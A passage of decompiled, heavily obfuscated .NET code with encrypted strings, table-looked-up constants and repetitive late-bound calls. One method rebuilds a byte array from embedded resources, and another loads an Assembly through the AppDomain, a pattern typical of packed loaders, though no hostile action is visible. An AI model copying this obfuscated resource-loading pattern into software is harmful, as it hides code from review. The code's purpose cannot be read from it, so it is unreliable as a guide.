							array2[_001E._000F(1272)] = i;
							array29[num25] = _000F_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array2, null), null, _0003._000F(612), new object[_001E._000F(1276)], null, null, null), _001E._000F(1280));
							_0007_000D._000F(obj35, null, text19, array4, null, null, null, (byte)_001E._000F(1284) != 0);
							array9 = new object[_001E._000F(1288)];
							array9[_001E._000F(1292)] = i;
							object obj36 = _0014_000D._000F(obj8, array9, null);
							string text20 = _0003._000F(459);
							array2 = new object[_001E._000F(1296)];
							object[] array30 = array2;
							int num26 = _001E._000F(1300);
							array14 = new object[_001E._000F(1304)];
							array14[_001E._000F(1308)] = i;
							array30[num26] = _000F_0016._000F(_0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(747), new object[_001E._000F(1312)], null, null, null), _001E._000F(1316));
							_0007_000D._000F(obj36, null, text20, array2, null, null, null, (byte)_001E._000F(1320) != 0);
						}
					}
				}
				i = checked(i + _001E._000F(1324));
			}
			while (i <= _001E._000F(1328));
			if (_0011_000D._000F(obj33, _001E._000F(1332), (byte)_001E._000F(1336) != 0))
			{
				int num3 = _001E._000F(1340);
				i = _001E._000F(1344);
				if (num3 > _001E._000F(1348))
				{
					int num21 = _001E._000F(1352);
					int num28 = default(int);
					checked
					{
						int num27 = default(int);
						do
						{
							object[] array9 = new object[_001E._000F(1356)];
							array9[_001E._000F(1360)] = num21;
							if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(684), new object[_001E._000F(1364)], null, null, null)))
							{
								object[] array14 = new object[_001E._000F(1368)];
								array14[_001E._000F(1372)] = num21;
								object obj37 = _0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(621), new object[_001E._000F(1376)], null, null, null);
								object[] array2 = new object[_001E._000F(1380)];
								array2[_001E._000F(1384)] = num21;
								if (_000C_000D._000F(_0002_000D._000F(obj37, _0013_000D._000F(_0014_000D._000F(obj8, array2, null), null, _0003._000F(396), new object[_001E._000F(1388)], null, null, null))))
								{
									num27 += _001E._000F(1392);
								}
							}
							num21 += _001E._000F(1396);
						}
						while (num21 <= _001E._000F(1400));
						if (num27 < _001E._000F(1404))
						{
							int num29 = default(int);
							while (num28 != _001E._000F(1448))
							{
								object[] array9 = new object[_001E._000F(1408)];
								array9[_001E._000F(1412)] = i;
								if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(684), new object[_001E._000F(1416)], null, null, null)))
								{
									object[] array14 = new object[_001E._000F(1420)];
									array14[_001E._000F(1424)] = i;
									if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(621), new object[_001E._000F(1428)], null, null, null))))
									{
										num28 = _001E._000F(1432);
										num21 = i;
									}
								}
								i = _001E._000F(1436);
								num29 += _001E._000F(1440);
								if (num29 == _001E._000F(1444))
								{
									break;
								}
							}
						}
					}
					if (num28 == _001E._000F(1452))
					{
						object[] array9 = new object[_001E._000F(1456)];
						array9[_001E._000F(1460)] = num21;
						object obj38 = _0014_000D._000F(obj8, array9, null);
						string text21 = _0003._000F(642);
						object[] array14 = new object[_001E._000F(1464)];
						array14[_001E._000F(1468)] = (byte)_001E._000F(1472) != 0;
						_0007_000D._000F(obj38, null, text21, array14, null, null, null, (byte)_001E._000F(1476) != 0);
						array9 = new object[_001E._000F(1480)];
						array9[_001E._000F(1484)] = num21;
						if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array9, null), null, _0003._000F(701), new object[_001E._000F(1488)], null, null, null)))
						{
							array14 = new object[_001E._000F(1492)];
							array14[_001E._000F(1496)] = num21;
							if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj8, array14, null), null, _0003._000F(396), new object[_001E._000F(1500)], null, null, null))))
							{
								object[] array2 = new object[_001E._000F(1504)];
								array2[_001E._000F(1508)] = num21;
								object obj39 = _0014_000D._000F(obj8, array2, null);
								string text22 = _0003._000F(756);
								object[] array4 = new object[_001E._000F(1512)];
								array4[_001E._000F(1516)] = (byte)_001E._000F(1520) != 0;
								_0007_000D._000F(obj39, null, text22, array4, null, null, null, (byte)_001E._000F(1524) != 0);
								array9 = new object[_001E._000F(1528)];
								array9[_001E._000F(1532)] = num21;
								object obj40 = _0014_000D._000F(obj8, array9, null);
								string text23 = _0003._000F(775);
								array14 = new object[_001E._000F(1536)];
								array14[_001E._000F(1540)] = (byte)_001E._000F(1544) != 0;
								_0007_000D._000F(obj40, null, text23, array14, null, null, null, (byte)_001E._000F(1548) != 0);
								return result;
							}
							return result;
						}
						return result;
					}
					return result;
				}
				return result;
			}
			return result;
		}
		catch (Exception ex)
		{
			_000A_000D._000F(ex, num24);
			_0008_000D._000F();
			return result;
		}
	}

	public static object _000F()
	{
		byte[] array = new byte[_001E._000F(1552)];
		ResourceManager resourceManager = _000B_0016._000F(_0003._000F(798), _0003_0016._000F(_000E._000F(typeof(_0010).TypeHandle)));
		string[] array2 = (string[])_0001_0016._000F(resourceManager, _0003._000F(801));
		string[] array3 = array2;
		checked
		{
			object obj = default(object);
			object obj2 = default(object);
			object obj3 = default(object);
			object obj4 = default(object);
			object obj6 = default(object);
			object obj7 = default(object);
			object obj10 = default(object);
			object obj11 = default(object);
			for (int i = _001E._000F(1556); i < array3.Length; i += _001E._000F(2156))
			{
				string text = array3[i];
				byte[] array4 = (byte[])_0001_0016._000F(resourceManager, text);
				Array.Resize(ref array, array.Length + array4.Length);
				try
				{
					if (_0019_0016._000F(obj, _001E._000F(1560), unchecked((byte)_001E._000F(1564)) != 0))
					{
						int num = _0005_0016._000F(obj2);
						int num2 = _0005_0016._000F(obj3);
						for (int j = num; j <= num2; j += _001E._000F(2148))
						{
							int num3 = _001E._000F(1568);
							do
							{
								object obj5 = obj4;
								unchecked
								{
									if (_0011_000D._000F(obj5, _001E._000F(1572), (byte)_001E._000F(1576) != 0))
									{
										object[] array5 = new object[_001E._000F(1580)];
										array5[_001E._000F(1584)] = _0017_0016._000F(_0017_0016._000F(j, obj6), checked(num3 * _001E._000F(1588)));
										if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj7, array5, null), null, _0003._000F(396), new object[_001E._000F(1592)], null, null, null))))
										{
											array5 = new object[_001E._000F(1596)];
											array5[_001E._000F(1600)] = _0017_0016._000F(j, obj6);
											object obj8 = _0014_000D._000F(obj7, array5, null);
											string text2 = _0003._000F(413);
											object[] array6 = new object[_001E._000F(1604)];
											object[] array7 = array6;
											int num4 = _001E._000F(1608);
											string text3 = _0003._000F(422);
											object[] array8 = new object[_001E._000F(1612)];
											object[] array9 = array8;
											int num5 = _001E._000F(1616);
											object obj9 = _001E._000F(1620);
											object[] array10 = new object[_001E._000F(1624)];
											array10[_001E._000F(1628)] = j;
											array9[num5] = _000F_0016._000F(obj9, _0014_000D._000F(obj10, array10, null));
											array7[num4] = _000F_0016._000F(_0013_000D._000F(obj11, null, text3, array8, null, null, null), _001E._000F(1632));
											_0007_000D._000F(obj8, null, text2, array6, null, null, null, (byte)_001E._000F(1636) != 0);
											array6 = new object[_001E._000F(1640)];
											array6[_001E._000F(1644)] = _0017_0016._000F(j, obj6);
											object obj12 = _0014_000D._000F(obj7, array6, null);
											string text4 = _0003._000F(459);
											array5 = new object[_001E._000F(1648)];
											object[] array11 = array5;
											int num6 = _001E._000F(1652);
											string text5 = _0003._000F(468);
											array10 = new object[_001E._000F(1656)];
											object[] array12 = array10;
											int num7 = _001E._000F(1660);
											object obj13 = _001E._000F(1664);
											array8 = new object[_001E._000F(1668)];
											array8[_001E._000F(1672)] = j;
											array12[num7] = _000F_0016._000F(obj13, _0014_000D._000F(obj10, array8, null));
											array11[num6] = _000F_0016._000F(_0013_000D._000F(obj11, null, text5, array10, null, null, null), _001E._000F(1676));
											_0007_000D._000F(obj12, null, text4, array5, null, null, null, (byte)_001E._000F(1680) != 0);
											array6 = new object[_001E._000F(1684)];
											array6[_001E._000F(1688)] = _0017_0016._000F(j, _0017_0016._000F(obj6, _001E._000F(1692)));
											object obj14 = _0014_000D._000F(obj7, array6, null);
											string text6 = _0003._000F(413);
											object[] array13 = new object[_001E._000F(1696)];
											object[] array14 = array13;
											int num8 = _001E._000F(1700);
											string text7 = _0003._000F(505);
											array10 = new object[_001E._000F(1704)];
											object[] array15 = array10;
											int num9 = _001E._000F(1708);
											array8 = new object[_001E._000F(1712)];
											array8[_001E._000F(1716)] = j;
											array15[num9] = _0014._000F(_0014_000D._000F(obj10, array8, null));
											array5 = array10;
											object[] array16 = array5;
											bool[] array17 = new bool[_001E._000F(1720)];
											array17[_001E._000F(1724)] = (byte)_001E._000F(1728) != 0;
											object obj15 = _0013_000D._000F(obj11, null, text7, array16, null, null, array17);
											object[] array18;
											if (array17[_001E._000F(1732)])
											{
												array18 = new object[_001E._000F(1736)];
												array18[_001E._000F(1740)] = j;
												array18[_001E._000F(1744)] = _0014._000F(array5[_001E._000F(1748)]);
												_0006_0016._000F(obj10, array18, null, (byte)_001E._000F(1752) != 0, (byte)_001E._000F(1756) != 0);
											}
											array14[num8] = _0017_0016._000F(obj15, _001E._000F(1760));
											_0007_000D._000F(obj14, null, text6, array13, null, null, null, (byte)_001E._000F(1764) != 0);
											array13 = new object[_001E._000F(1768)];
											array13[_001E._000F(1772)] = _0017_0016._000F(j, _0017_0016._000F(obj6, _001E._000F(1776)));
											object obj16 = _0014_000D._000F(obj7, array13, null);
											string text8 = _0003._000F(459);
											array5 = new object[_001E._000F(1780)];
											object[] array19 = array5;
											int num10 = _001E._000F(1784);
											string text9 = _0003._000F(544);
											array6 = new object[_001E._000F(1788)];
											object[] array20 = array6;
											int num11 = _001E._000F(1792);
											array18 = new object[_001E._000F(1796)];
											array18[_001E._000F(1800)] = j;
											array20[num11] = _0014._000F(_0014_000D._000F(obj10, array18, null));
											array8 = array6;
											object[] array21 = array8;
											array17 = new bool[_001E._000F(1804)];
											array17[_001E._000F(1808)] = (byte)_001E._000F(1812) != 0;
											object obj17 = _0013_000D._000F(obj11, null, text9, array21, null, null, array17);
											if (array17[_001E._000F(1816)])
											{
												array10 = new object[_001E._000F(1820)];
												array10[_001E._000F(1824)] = j;
												array10[_001E._000F(1828)] = _0014._000F(array8[_001E._000F(1832)]);
												_0006_0016._000F(obj10, array10, null, (byte)_001E._000F(1836) != 0, (byte)_001E._000F(1840) != 0);
											}
											array19[num10] = _000F_0016._000F(obj17, _001E._000F(1844));
											_0007_000D._000F(obj16, null, text8, array5, null, null, null, (byte)_001E._000F(1848) != 0);
										}
										int num12 = _001E._000F(1852);
									}
									else if (_0011_000D._000F(obj5, _001E._000F(1856), (byte)_001E._000F(1860) != 0))
									{
										object[] array13 = new object[_001E._000F(1864)];
										array13[_001E._000F(1868)] = _0017_0016._000F(_0017_0016._000F(j, obj6), checked(num3 * _001E._000F(1872)));
										if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(_0014_000D._000F(obj7, array13, null), null, _0003._000F(396), new object[_001E._000F(1876)], null, null, null))))
										{
											array13 = new object[_001E._000F(1880)];
											array13[_001E._000F(1884)] = _0017_0016._000F(j, obj6);
											object obj18 = _0014_000D._000F(obj7, array13, null);
											string text10 = _0003._000F(413);
											object[] array5 = new object[_001E._000F(1888)];
											object[] array22 = array5;
											int num13 = _001E._000F(1892);
											string text11 = _0003._000F(422);
											object[] array6 = new object[_001E._000F(1896)];
											object[] array23 = array6;
											int num14 = _001E._000F(1900);
											object[] array18 = new object[_001E._000F(1904)];
											array18[_001E._000F(1908)] = j;
											array23[num14] = _0014._000F(_0014_000D._000F(obj10, array18, null));
											object[] array8 = array6;
											object[] array24 = array8;
											bool[] array17 = new bool[_001E._000F(1912)];
											array17[_001E._000F(1916)] = (byte)_001E._000F(1920) != 0;
											object obj19 = _0013_000D._000F(obj11, null, text11, array24, null, null, array17);
											if (array17[_001E._000F(1924)])
											{
												object[] array10 = new object[_001E._000F(1928)];
												array10[_001E._000F(1932)] = j;
												array10[_001E._000F(1936)] = _0014._000F(array8[_001E._000F(1940)]);
												_0006_0016._000F(obj10, array10, null, (byte)_001E._000F(1944) != 0, (byte)_001E._000F(1948) != 0);
											}
											array22[num13] = _000F_0016._000F(obj19, _001E._000F(1952));
											_0007_000D._000F(obj18, null, text10, array5, null, null, null, (byte)_001E._000F(1956) != 0);
											array13 = new object[_001E._000F(1960)];
											array13[_001E._000F(1964)] = _0017_0016._000F(j, obj6);
											object obj20 = _0014_000D._000F(obj7, array13, null);
											string text12 = _0003._000F(459);
											array5 = new object[_001E._000F(1968)];
											object[] array25 = array5;
											int num15 = _001E._000F(1972);
											string text13 = _0003._000F(468);
											array6 = new object[_001E._000F(1976)];
											object[] array26 = array6;
											int num16 = _001E._000F(1980);
											array18 = new object[_001E._000F(1984)];
											array18[_001E._000F(1988)] = j;
											array26[num16] = _0014._000F(_0014_000D._000F(obj10, array18, null));
											array8 = array6;
											object[] array27 = array8;
											array17 = new bool[_001E._000F(1992)];
											array17[_001E._000F(1996)] = (byte)_001E._000F(2000) != 0;
											object obj21 = _0013_000D._000F(obj11, null, text13, array27, null, null, array17);
											if (array17[_001E._000F(2004)])
											{
												object[] array10 = new object[_001E._000F(2008)];
												array10[_001E._000F(2012)] = j;
												array10[_001E._000F(2016)] = _0014._000F(array8[_001E._000F(2020)]);
												_0006_0016._000F(obj10, array10, null, (byte)_001E._000F(2024) != 0, (byte)_001E._000F(2028) != 0);
											}
											array25[num15] = _000F_0016._000F(obj21, _001E._000F(2032));
											_0007_000D._000F(obj20, null, text12, array5, null, null, null, (byte)_001E._000F(2036) != 0);
											array13 = new object[_001E._000F(2040)];
											array13[_001E._000F(2044)] = _0017_0016._000F(j, _0017_0016._000F(obj6, _001E._000F(2048)));
											object obj22 = _0014_000D._000F(obj7, array13, null);
											string text14 = _0003._000F(413);
											array8 = new object[_001E._000F(2052)];
											object[] array28 = array8;
											int num17 = _001E._000F(2056);
											string text15 = _0003._000F(505);
											array6 = new object[_001E._000F(2060)];
											object[] array29 = array6;
											int num18 = _001E._000F(2064);
											object obj23 = _001E._000F(2068);
											array18 = new object[_001E._000F(2072)];
											array18[_001E._000F(2076)] = j;
											array29[num18] = _000F_0016._000F(obj23, _0014_000D._000F(obj10, array18, null));
											array28[num17] = _0017_0016._000F(_0013_000D._000F(obj11, null, text15, array6, null, null, null), _001E._000F(2080));
											_0007_000D._000F(obj22, null, text14, array8, null, null, null, (byte)_001E._000F(2084) != 0);
											array13 = new object[_001E._000F(2088)];
											array13[_001E._000F(2092)] = _0017_0016._000F(j, _0017_0016._000F(obj6, _001E._000F(2096)));
											object obj24 = _0014_000D._000F(obj7, array13, null);
											string text16 = _0003._000F(459);
											array8 = new object[_001E._000F(2100)];
											object[] array30 = array8;
											int num19 = _001E._000F(2104);
											string text17 = _0003._000F(544);
											array6 = new object[_001E._000F(2108)];
											object[] array31 = array6;
											int num20 = _001E._000F(2112);
											object obj25 = _001E._000F(2116);
											array18 = new object[_001E._000F(2120)];
											array18[_001E._000F(2124)] = j;
											array31[num20] = _000F_0016._000F(obj25, _0014_000D._000F(obj10, array18, null));
											array30[num19] = _000F_0016._000F(_0013_000D._000F(obj11, null, text17, array6, null, null, null), _001E._000F(2128));
											_0007_000D._000F(obj24, null, text16, array8, null, null, null, (byte)_001E._000F(2132) != 0);
										}
										int num12 = _001E._000F(2136);
									}
								}
								num3 += _001E._000F(2140);
							}
							while (num3 <= _001E._000F(2144));
						}
					}
				}
				catch (Exception ex)
				{
					_0009_0016._000F(ex);
					Exception ex2 = ex;
					_0008_000D._000F();
				}
				_001F_0016._000F(array4, _001E._000F(2152), array, array.Length - array4.Length, array4.Length);
			}
			return array;
		}
	}

	public static void _000F()
	{
		object obj = default(object);
		try
		{
			AppDomain appDomain = _001A_0016._000F();
			string text = _0003._000F(804);
			object[] array = new object[_001E._000F(2160)];
			array[_001E._000F(2164)] = _0014._000F(_001D(_001E._000F(2168)));
			obj = _0014._000F(_0013_000D._000F(appDomain, null, text, array, null, null, null));
			int num = _001E._000F(2172);
			do
			{
				num = checked(num + _001E._000F(2176));
			}
			while (num <= _001E._000F(2180));
			object obj2 = default(object);
			_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(obj2, null, _0003._000F(813), new object[_001E._000F(2184)], null, null, null)));
			array = new object[_001E._000F(2188)];
			array[_001E._000F(2192)] = num;
			object obj3 = default(object);
			if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj3, array, null), null, _0003._000F(621), new object[_001E._000F(2196)], null, null, null)))
			{
				string text2 = _0003._000F(826);
				object[] array2 = new object[_001E._000F(2200)];
				object[] array3 = array2;
				int num2 = _001E._000F(2204);
				array = new object[_001E._000F(2208)];
				array[_001E._000F(2212)] = num;
				array3[num2] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj3, array, null), null, _0003._000F(829), new object[_001E._000F(2216)], null, null, null));
				object obj4 = default(object);
				_001E_0016._000F(obj4, null, text2, array2, null, null);
				string text3 = _0003._000F(858);
				array = new object[_001E._000F(2220)];
				object[] array4 = array;
				int num3 = _001E._000F(2224);
				array2 = new object[_001E._000F(2228)];
				array2[_001E._000F(2232)] = num;
				array4[num3] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj3, array2, null), null, _0003._000F(861), new object[_001E._000F(2236)], null, null, null));
				_001E_0016._000F(obj4, null, text3, array, null, null);
				string text4 = _0003._000F(890);
				array = new object[_001E._000F(2240)];
				object[] array5 = array;
				int num4 = _001E._000F(2244);
				array2 = new object[_001E._000F(2248)];
				array2[_001E._000F(2252)] = num;
				array5[num4] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj3, array2, null), null, _0003._000F(901), new object[_001E._000F(2256)], null, null, null));
				_001E_0016._000F(obj4, null, text4, array, null, null);
				string text5 = _0003._000F(930);
				array = new object[_001E._000F(2260)];
				object[] array6 = array;
				int num5 = _001E._000F(2264);
				array2 = new object[_001E._000F(2268)];
				array2[_001E._000F(2272)] = num;
				array6[num5] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj3, array2, null), null, _0003._000F(943), new object[_001E._000F(2276)], null, null, null));
				_001E_0016._000F(obj4, null, text5, array, null, null);
				string text6 = _0003._000F(972);
				array2 = new object[_001E._000F(2280)];
				object obj5 = default(object);
				array2[_001E._000F(2284)] = _0014._000F(obj5);
				array = array2;
				object[] array7 = array;
				bool[] array8 = new bool[_001E._000F(2288)];
				array8[_001E._000F(2292)] = (byte)_001E._000F(2296) != 0;
				object obj6 = _0013_000D._000F(obj4, null, text6, array7, null, null, array8);
				if (array8[_001E._000F(2300)])
				{
					obj5 = _0014._000F(array[_001E._000F(2304)]);
				}
				if (_000C_000D._000F(obj6))
				{
					bool flag = (byte)_001E._000F(2308) != 0;
					array2 = new object[_001E._000F(2312)];
					array2[_001E._000F(2316)] = num;
					object obj7 = _0014_000D._000F(obj3, array2, null);
					string text7 = _0003._000F(642);
					array = new object[_001E._000F(2320)];
					array[_001E._000F(2324)] = (byte)_001E._000F(2328) != 0;
					_0007_000D._000F(obj7, null, text7, array, null, null, null, (byte)_001E._000F(2332) != 0);
				}
				if (_000C_000D._000F(_0013_000D._000F(obj2, null, _0003._000F(1001), new object[_001E._000F(2336)], null, null, null)))
				{
					object obj8 = obj5;
					string text8 = _0003._000F(826);
					array2 = new object[_001E._000F(2340)];
					array2[_001E._000F(2344)] = _0014._000F(_0013_000D._000F(obj2, null, _0003._000F(1020), new object[_001E._000F(2348)], null, null, null));
					_001E_0016._000F(obj8, null, text8, array2, null, null);
					object obj9 = obj5;
					string text9 = _0003._000F(858);
					array2 = new object[_001E._000F(2352)];
					array2[_001E._000F(2356)] = _0014._000F(_0013_000D._000F(obj2, null, _0003._000F(1049), new object[_001E._000F(2360)], null, null, null));
					_001E_0016._000F(obj9, null, text9, array2, null, null);
					object obj10 = obj5;
					string text10 = _0003._000F(890);
					array2 = new object[_001E._000F(2364)];
					array2[_001E._000F(2368)] = _0014._000F(_0013_000D._000F(obj2, null, _0003._000F(1078), new object[_001E._000F(2372)], null, null, null));
					_001E_0016._000F(obj10, null, text10, array2, null, null);
					object obj11 = obj5;
					string text11 = _0003._000F(930);
					array2 = new object[_001E._000F(2376)];
					array2[_001E._000F(2380)] = _0014._000F(_0013_000D._000F(obj2, null, _0003._000F(1107), new object[_001E._000F(2384)], null, null, null));
					_001E_0016._000F(obj11, null, text11, array2, null, null);
					string text12 = _0003._000F(972);
					array2 = new object[_001E._000F(2388)];
					array2[_001E._000F(2392)] = _0014._000F(obj5);
					array = array2;
					object[] array9 = array;
					array8 = new bool[_001E._000F(2396)];
					array8[_001E._000F(2400)] = (byte)_001E._000F(2404) != 0;
					object obj12 = _0013_000D._000F(obj4, null, text12, array9, null, null, array8);
					if (array8[_001E._000F(2408)])
					{
						obj5 = _0014._000F(array[_001E._000F(2412)]);
					}
					if (_000C_000D._000F(obj12))
					{
						object[] array10 = new object[_001E._000F(2416)];
						array10[_001E._000F(2420)] = num;
						object obj13 = _0014_000D._000F(obj3, array10, null);
						string text13 = _0003._000F(642);
						object[] array11 = new object[_001E._000F(2424)];
						array11[_001E._000F(2428)] = (byte)_001E._000F(2432) != 0;
						_0007_000D._000F(obj13, null, text13, array11, null, null, null, (byte)_001E._000F(2436) != 0);
					}
				}
			}
		}
		catch (Exception ex)
		{
			_0009_0016._000F(ex);
			_0008_000D._000F();
		}
		object obj14 = _0014._000F(_000F((Assembly)obj));
	}

	public static void _000D(object _000F, object _000D)
	{
		//IL_18ab: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			string text = _0003._000F(1136);
			object[] array = new object[_001E._000F(2440)];
			array[_001E._000F(2444)] = null;
			array[_001E._000F(2448)] = new object[_001E._000F(2452)];
			_0007_000D._000F(_000D, null, text, array, null, null, null, (byte)_001E._000F(2456) != 0);
			int num = _001E._000F(2460);
			object obj = default(object);
			object obj2 = default(object);
			object obj3 = default(object);
			object obj4 = default(object);
			bool flag = default(bool);
			object obj21 = default(object);
			object obj22 = default(object);
			object obj24 = default(object);
			object obj31 = default(object);
			bool flag2 = default(bool);
			object obj35 = default(object);
			bool flag3 = default(bool);
			int num20 = default(int);
			do
			{
				if (_000C_000D._000F(_000E_000D._000F(_0013_000D._000F(obj, null, _0003._000F(813), new object[_001E._000F(2464)], null, null, null))))
				{
					array = new object[_001E._000F(2468)];
					array[_001E._000F(2472)] = num;
					object[] array11;
					if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj2, array, null), null, _0003._000F(621), new object[_001E._000F(2476)], null, null, null)))
					{
						string text2 = _0003._000F(826);
						object[] array2 = new object[_001E._000F(2480)];
						object[] array3 = array2;
						int num2 = _001E._000F(2484);
						array = new object[_001E._000F(2488)];
						array[_001E._000F(2492)] = num;
						array3[num2] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array, null), null, _0003._000F(829), new object[_001E._000F(2496)], null, null, null));
						_001E_0016._000F(obj3, null, text2, array2, null, null);
						string text3 = _0003._000F(858);
						array = new object[_001E._000F(2500)];
						object[] array4 = array;
						int num3 = _001E._000F(2504);
						array2 = new object[_001E._000F(2508)];
						array2[_001E._000F(2512)] = num;
						array4[num3] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array2, null), null, _0003._000F(861), new object[_001E._000F(2516)], null, null, null));
						_001E_0016._000F(obj3, null, text3, array, null, null);
						string text4 = _0003._000F(890);
						array = new object[_001E._000F(2520)];
						object[] array5 = array;
						int num4 = _001E._000F(2524);
						array2 = new object[_001E._000F(2528)];
						array2[_001E._000F(2532)] = num;
						array5[num4] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array2, null), null, _0003._000F(901), new object[_001E._000F(2536)], null, null, null));
						_001E_0016._000F(obj3, null, text4, array, null, null);
						string text5 = _0003._000F(930);
						array = new object[_001E._000F(2540)];
						object[] array6 = array;
						int num5 = _001E._000F(2544);
						array2 = new object[_001E._000F(2548)];
						array2[_001E._000F(2552)] = num;
						array6[num5] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array2, null), null, _0003._000F(943), new object[_001E._000F(2556)], null, null, null));
						_001E_0016._000F(obj3, null, text5, array, null, null);
						string text6 = _0003._000F(972);
						array2 = new object[_001E._000F(2560)];
						array2[_001E._000F(2564)] = _0014._000F(obj4);
						array = array2;
						object[] array7 = array;
						bool[] array8 = new bool[_001E._000F(2568)];
						array8[_001E._000F(2572)] = (byte)_001E._000F(2576) != 0;
						object obj5 = _0013_000D._000F(obj3, null, text6, array7, null, null, array8);
						if (array8[_001E._000F(2580)])
						{
							obj4 = _0014._000F(array[_001E._000F(2584)]);
						}
						if (_000C_000D._000F(obj5))
						{
							flag = (byte)_001E._000F(2588) != 0;
							array2 = new object[_001E._000F(2592)];
							array2[_001E._000F(2596)] = num;
							object obj6 = _0014_000D._000F(obj2, array2, null);
							string text7 = _0003._000F(642);
							array = new object[_001E._000F(2600)];
							array[_001E._000F(2604)] = (byte)_001E._000F(2608) != 0;
							_0007_000D._000F(obj6, null, text7, array, null, null, null, (byte)_001E._000F(2612) != 0);
						}
						if (_000C_000D._000F(_0013_000D._000F(obj, null, _0003._000F(1001), new object[_001E._000F(2616)], null, null, null)))
						{
							object obj7 = obj4;
							string text8 = _0003._000F(826);
							array2 = new object[_001E._000F(2620)];
							array2[_001E._000F(2624)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1020), new object[_001E._000F(2628)], null, null, null));
							_001E_0016._000F(obj7, null, text8, array2, null, null);
							object obj8 = obj4;
							string text9 = _0003._000F(858);
							array2 = new object[_001E._000F(2632)];
							array2[_001E._000F(2636)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1049), new object[_001E._000F(2640)], null, null, null));
							_001E_0016._000F(obj8, null, text9, array2, null, null);
							object obj9 = obj4;
							string text10 = _0003._000F(890);
							array2 = new object[_001E._000F(2644)];
							array2[_001E._000F(2648)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1078), new object[_001E._000F(2652)], null, null, null));
							_001E_0016._000F(obj9, null, text10, array2, null, null);
							object obj10 = obj4;
							string text11 = _0003._000F(930);
							array2 = new object[_001E._000F(2656)];
							array2[_001E._000F(2660)] = _0014._000F(_0013_000D._000F(obj, null, _0003._000F(1107), new object[_001E._000F(2664)], null, null, null));
							_001E_0016._000F(obj10, null, text11, array2, null, null);
							string text12 = _0003._000F(972);
							array2 = new object[_001E._000F(2668)];
							array2[_001E._000F(2672)] = _0014._000F(obj4);
							array = array2;
							object[] array9 = array;
							array8 = new bool[_001E._000F(2676)];
							array8[_001E._000F(2680)] = (byte)_001E._000F(2684) != 0;
							object obj11 = _0013_000D._000F(obj3, null, text12, array9, null, null, array8);
							if (array8[_001E._000F(2688)])
							{
								obj4 = _0014._000F(array[_001E._000F(2692)]);
							}
							if (_000C_000D._000F(obj11))
							{
								object[] array10 = new object[_001E._000F(2696)];
								array10[_001E._000F(2700)] = num;
								object obj12 = _0014_000D._000F(obj2, array10, null);
								string text13 = _0003._000F(642);
								array11 = new object[_001E._000F(2704)];
								array11[_001E._000F(2708)] = (byte)_001E._000F(2712) != 0;
								_0007_000D._000F(obj12, null, text13, array11, null, null, null, (byte)_001E._000F(2716) != 0);
							}
						}
					}
					array11 = new object[_001E._000F(2720)];
					array11[_001E._000F(2724)] = num;
					if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(684), new object[_001E._000F(2728)], null, null, null)))
					{
						object[] array10 = new object[_001E._000F(2732)];
						array10[_001E._000F(2736)] = num;
						if (_000C_000D._000F(_0013_000D._000F(_0014_000D._000F(obj2, array10, null), null, _0003._000F(396), new object[_001E._000F(2740)], null, null, null)))
						{
							string text14 = _0003._000F(826);
							array10 = new object[_001E._000F(2744)];
							object[] array12 = array10;
							int num6 = _001E._000F(2748);
							array11 = new object[_001E._000F(2752)];
							array11[_001E._000F(2756)] = num;
							array12[num6] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1149), new object[_001E._000F(2760)], null, null, null));
							_001E_0016._000F(obj3, null, text14, array10, null, null);
							string text15 = _0003._000F(858);
							array10 = new object[_001E._000F(2764)];
							object[] array13 = array10;
							int num7 = _001E._000F(2768);
							array11 = new object[_001E._000F(2772)];
							array11[_001E._000F(2776)] = num;
							array13[num7] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1166), new object[_001E._000F(2780)], null, null, null));
							_001E_0016._000F(obj3, null, text15, array10, null, null);
							string text16 = _0003._000F(890);
							array10 = new object[_001E._000F(2784)];
							object[] array14 = array10;
							int num8 = _001E._000F(2788);
							array11 = new object[_001E._000F(2792)];
							array11[_001E._000F(2796)] = num;
							array14[num8] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1183), new object[_001E._000F(2800)], null, null, null));
							_001E_0016._000F(obj3, null, text16, array10, null, null);
							string text17 = _0003._000F(930);
							array10 = new object[_001E._000F(2804)];
							object[] array15 = array10;
							int num9 = _001E._000F(2808);
							array11 = new object[_001E._000F(2812)];
							array11[_001E._000F(2816)] = num;
							array15[num9] = _0014._000F(_0013_000D._000F(_0014_000D._000F(obj2, array11, null), null, _0003._000F(1200), new object[_001E._000F(2820)], null, null, null));
							_001E_0016._000F(obj3, null, text17, array10, null, null);
							string text18 = _0003._000F(972);
							array11 = new object[_001E._000F(2824)];
							array11[_001E._000F(2828)] = _0014._000F(obj4);
							array10 = array11;
							object[] array16 = array10;
							bool[] array8 = new bool[_001E._000F(2832)];
